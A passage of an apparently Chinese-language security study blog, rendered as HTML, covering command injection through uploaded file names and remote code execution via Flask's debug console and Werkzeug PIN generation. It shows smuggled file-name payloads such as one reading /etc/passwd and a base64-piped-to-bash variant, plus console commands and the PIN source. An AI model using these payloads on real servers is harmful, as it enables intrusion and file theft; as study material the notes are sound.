11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1 hahahaha .txt</p></blockquote>\n<p>如果想要命名，则需要单引号包裹</p>\n<p><img src=\"/post/Note/image-20230501222722767.png\" alt=\"image-20230501222722767\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>&#x3D;&#x3D;&gt;所以如果存在一个环境，会将上传的zip文件自动解压，或者会将上传文件进行检测并把上传文件文件名包含在命令中，并且没有加上引号限制字符类型</p></blockquote>\n<p>比如</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">unzip -oq /tmp/xx -d /home/\nor\ncat /tmp/xx</code></pre>\n\n<p>那么猜测如果文件名为</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1;cat &#x2F;etc&#x2F;passwd;zip</p></blockquote>\n<p>那么执行时，就会导致</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">unzip -oq /tmp/1;\ncat /etc/passwd;\n.zip -d /home/</code></pre>\n\n<p>就实现了上传文件达到RCE的目的，并且这些命令大都是以root权限执行的命令，所以操作性极大，危害极大，实际环境应注意这些用户可控的数据数据不能不经过处理并入任何命令中去</p>\n<hr>\n<p>当然实际环境下命令大都可能会因为一些原因被过滤或者无法执行，亦或者是内容无法回显，可以考虑将其转换为其他编码类型，并将回显内容导入到其他文件中去，再来执行</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1;echo L2ZsYWcgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9mbGFnLnR4dA&#x3D;&#x3D;|base64 -d|bash;.zip</p>\n<p>#echo &#x2F;flag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;flag.txt</p></blockquote>\n<h1 id=\"Flask的Debug模式\"><a href=\"#Flask的Debug模式\" class=\"headerlink\" title=\"Flask的Debug模式\"></a>Flask的Debug模式</h1><p>在比赛时，看到有道题大佬一直在说看看<code>flask</code>的<code>debug</code>开启没，记录学习一下</p>\n<p>使用 Flask 开发过程中存在两个常见的问题：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li>当 Flask 程序出错时，没有提示错误的详细信息；</li>\n<li>修改 Flask 源代码后需要重启 Flask 程序。</li>\n</ol></blockquote>\n<p>debug模式开启的代码就是</p>\n<pre class=\" language-highlight py\"><span class=\"keyword\">from</span> flask <span class=\"keyword\"><code class=\"language-highlight py\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask\napp = Flask(__name__)\n\n<span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:\n    app.run(debug = <span class=\"literal\">True</span>) <span class=\"comment\">#这里就是开启debug模式</span></code></pre>\n\n<p>运行时，显示输出也会显示debug模式开启</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>$ python3 debug.py</p>\n<ul>\n<li>Serving Flask app “debug” (lazy loading)</li>\n<li>Environment: production</li>\n<li><code>Debug mode: on</code></li>\n<li>Restarting with stat</li>\n<li>Debugger is active!</li>\n<li>Debugger PIN: 316-471-540</li>\n<li>Running on <a href=\"http://127.0.0.1:5000/\">http://127.0.0.1:5000/</a> (Press CTRL+C to quit)</li>\n</ul></blockquote>\n<p>开启后，当程序运行错误时，网站页面就会将错误点所在代码显示，并且给出错误原因以及修正方案</p>\n<p>而如果不开启debug模式，显示的结果就不会显示错误原因</p>\n<p><img src=\"/post/Note/image-20230615002937536.png\" alt=\"image-20230615002937536\"></p>\n<p>而开启后就是</p>\n<p><img src=\"/post/Note/image-20230615002956862.png\" alt=\"image-20230615002956862\"></p>\n<p>而修改的话，也不用退出程序，重新加载</p>\n<p>直接修改代码，然后保存，就会成功修改并且自行重启，并且不会影响程序的正常运行，程序输出也会显示程序已修改</p>\n<p><img src=\"/post/Note/image-20230615003317118.png\" alt=\"image-20230615003317118\"></p>\n<h2 id=\"利用debug功能能干啥\"><a href=\"#利用debug功能能干啥\" class=\"headerlink\" title=\"利用debug功能能干啥\"></a>利用debug功能能干啥</h2><p>flask在debug模式下会生成一个debugger pin，并且多次重启flask服务，PIN码不会改变</p>\n<p><img src=\"/post/Note/image-20230615134425055.png\" alt=\"image-20230615134425055\"></p>\n<p>通过PIN码可以进入python的交互式shell</p>\n<p>如</p>\n<p><img src=\"/post/Note/image-20230615134634288.png\" alt=\"image-20230615134634288\"></p>\n<p>这里<code>1/0</code>报错</p>\n<p>点击后，右边就会显示一个终端的图标，点击后，需要提供PIN码，然后便可以进入交互式shell</p>\n<p><img src=\"/post/Note/image-20230615134831790.png\" alt=\"image-20230615134831790\"></p>\n<p>查看当前目录下文件</p>\n<pre class=\" language-highlight py\"><span class=\"keyword\"><code class=\"language-highlight py\"><span class=\"keyword\">import</span> subprocess\n\nresult = subprocess.run(<span class=\"string\">&#x27;dir&#x27;</span>, shell=<span class=\"literal\">True</span>, stdout=subprocess.PIPE)\n\noutput = result.stdout.decode(<span class=\"string\">&#x27;gbk&#x27;</span>)\n\n<span class=\"built_in\">print</span>(output)</code></pre>\n\n<p><img src=\"/post/Note/image-20230615135711738.png\" alt=\"image-20230615135711738\"></p>\n<p>而服务器端的请求头</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:30] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;import%20subprocess&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:35] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;result%20%3D%20subprocess.run(‘dir’,%20shell%3DTrue,%20stdout%3Dsubprocess.PIPE)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:40] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;output%20%3D%20result.stdout.decode(‘gbk’)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:45] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;print(output)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -</p></blockquote>\n<p>所以可以看到，启动debug在公开环境下，是非常不安全的，不仅用户可以看到你的代码内容，而且如果当前flask服务的PIN码泄露，还会造成被攻击者远程执行命令等一系列恶意操作</p>\n<p>但是也不容易实现这个条件</p>\n<p><img src=\"/post/Note/image-20230617144803167.png\" alt=\"image-20230617144803167\"></p>\n<p>因为PIN rce实现是需要设置cookie头的，而且实际进行时会发现 PIN RCE 无法进行<code>CRLF</code>拆分注入，因为它根本不解析回车换行，只能一行行进行输入，所以很难实现</p>\n<h2 id=\"PIN-码如何生成\"><a href=\"#PIN-码如何生成\" class=\"headerlink\" title=\"PIN 码如何生成\"></a>PIN 码如何生成</h2><p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>\n<p>在</p>\n<pre class=\" language-highlight py\">app.run(debug = <span class=\"literal\">True</span>)app.run(debug = <span class=\"literal\"><code class=\"language-highlight py\">app.run(debug = <span class=\"literal\">True</span>)app.run(debug = <span class=\"literal\">True</span>)</code></pre>\n\n<p>这段代码敲断点，发现了<code>get_pin_and_cookie_name</code>函数</p>\n<pre class=\" language-highlight py\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_pin_and_cookie_name</span>(<span class=\"params\"><code class=\"language-highlight py\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_pin_and_cookie_name</span>(<span class=\"params\"></span>\n<span class=\"params\">    app: <span class=\"string\">\"WSGIApplication\"</span>,</span>\n<span class=\"params\"></span>) -> t.<span class=\"type\">Union</span>[t.<span class=\"type\">Tuple</span>[<span class=\"built_in\">str</span>, <span class=\"built_in\">str</span>], t.<span class=\"type\">Tuple</span>[<span class=\"literal\">None</span>, <span class=\"literal\">None</span>]]:\n    <span class=\"string\">\"\"\"Given an application object this returns a semi-stable 9 digit pin</span>\n<span class=\"string\">    code and a random key.  The hope is that this is stable between</span>\n<span class=\"string\">    restarts to not make debugging particularly frustrating.  If the pin</span>\n<span class=\"string\">    was forcefully disabled this returns `None`.</span>\n<span class=\"string\">​</span>\n<span class=\"string\">    Second item in the resulting tuple is the cookie name for remembering.</span>\n<span class=\"string\">    \"\"\"</span>\n    pin = os.environ.get(<span class=\"string\">\"WERKZEUG_DEBUG_PIN\"</span>)\n    rv = <span class=\"literal\">None</span>\n    num = <span class=\"literal\">None</span>\n​\n    Pin was explicitly disabled\n    <span class=\"keyword\">if</span> pin == <span class=\"string\">\"off\"</span>:\n        <span class=\"keyword\">return</span> <span class=\"literal\">None</span>, <span class=\"literal\">None</span>\n​\n    <span class=\"comment\"># Pin was provided explicitly</span>\n    <span class=\"keyword\">if</span> pin <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span> <span class=\"keyword\">and</span> pin.replace(<span class=\"string\">\"-\"</span>, <span class=\"string\">\"\"</span>).isdigit():\n        <span class=\"comment\"># If there are separators in the pin, return it directly</span>\n        <span class=\"keyword\">if</span> <span class=\"string\">\"-\"</span> <span class=\"keyword\">in</span> pin:\n            rv = pin\n        <span class=\"keyword\">else</span>:\n            num = pin\n​\n    modname = <span class=\"built_in\">getattr</span>(app, <span class=\"string\">\"__module__\"</span>, t.cast(<span class=\"built_in\">object</span>, app).__class__.__module__)\n    username: t.<span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>]\n​\n    <span class=\"keyword\">try</span>:\n        <span class=\"comment\"># getuser imports the pwd module, which does not exist in Google</span>\n        <span class=\"comment\"># App Engine. It may also raise a KeyError if the UID does not</span>\n        <span class=\"comment\"># have a username, such as in Docker.</span>\n        username = getpass.getuser()\n    <span class=\"keyword\">except</span> (ImportError, KeyError):\n        username = <span class=\"literal\">None</span>\n​\n    mod = sys.modules.get(modname)\n​\n    <span class=\"comment\"># This information only exists to make the cookie unique on the</span>\n    <span class=\"comment\"># computer, not as a security feature.</span>\n    probably_public_bits = [\n        username,\n        modname,\n        <span class=\"built_in\">getattr</span>(app, <span class=\"string\">\"__name__\"</span>, <span class=\"built_in\">type</span>(app).__name__),\n        <span class=\"built_in\">getattr</span>(mod, <span class=\"string\">\"__file__\"</span>, <span class=\"literal\">None</span>),\n    ]\n​\n    <span class=\"comment\"># This information is here to make it harder for an attacker to</span>\n    <span class=\"comment\"># guess the cookie name.  They are unlikely to be contained anywhere</span>\n    <span class=\"comment\"># within the unauthenticated debug page.</span>\n    private_bits = [<span class=\"built_in\">str</span>(uuid.getnode()), get_machine_id()]\n​\n    h = hashlib.sha1()\n    <span class=\"keyword\">for</span> bit <span class=\"keyword\">in</span> chain(probably_public_bits, private_bits):\n        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:\n            <span class=\"keyword\">continue</span>\n        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(bit, <span class=\"built_in\">str</span>):\n            bit = bit.encode(<span class=\"string\">\"utf-8\"</span>)\n        h.update(bit)\n    h.update(<span class=\"string\">b\"cookiesalt\"</span>)\n​\n    cookie_name = <span class=\"string\">f\"__wzd<span class=\"subst\">&#123;h.hexdigest()[:<span class=\"number\">20</span>]&#125;</span>\"</span>\n​\n    <span class=\"comment\"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span>\n    <span class=\"comment\"># end up with the same value and generate out 9 digits</span>\n    <span class=\"keyword\">if</span> num <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:\n        h.update(<span class=\"string\">b\"pinsalt\"</span>)\n        num = <span class=\"string\">f\"<span class=\"subst\">&#123;<span class=\"built_in\">int</span>(h.hexdigest(), <span class=\"number\">16</span>):09d&#125;</span>\"</span>[:<span class=\"number\">9</span>]\n​\n    <span class=\"comment\"># Format the pincode in groups of digits for easier remembering if</span>\n    <span class=\"comment\"># we don&#x27;t have a result yet.</span>\n    <span class=\"keyword\">if</span> rv <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:\n        <span class=\"keyword\">for</span> group_size <span class=\"keyword\">in</span> <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>:\n            <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(num) % group_size == <span class=\"number\">0</span>:\n                rv = <span class=\"string\">\"-\"</span>.join(\n                    num[x : x + group_size].rjust(group_size, <span class=\"string\">\"0\"</span>)\n                    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(num), group_size)\n                )\n                <span class=\"keyword\">break</span>\n        <span class=\"keyword\">else</span>:\n            rv = num\n​\n    <span class=\"keyword\">return</span> rv, cookie_name</code></pre>\n\n<p><strong>生成要素：</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path 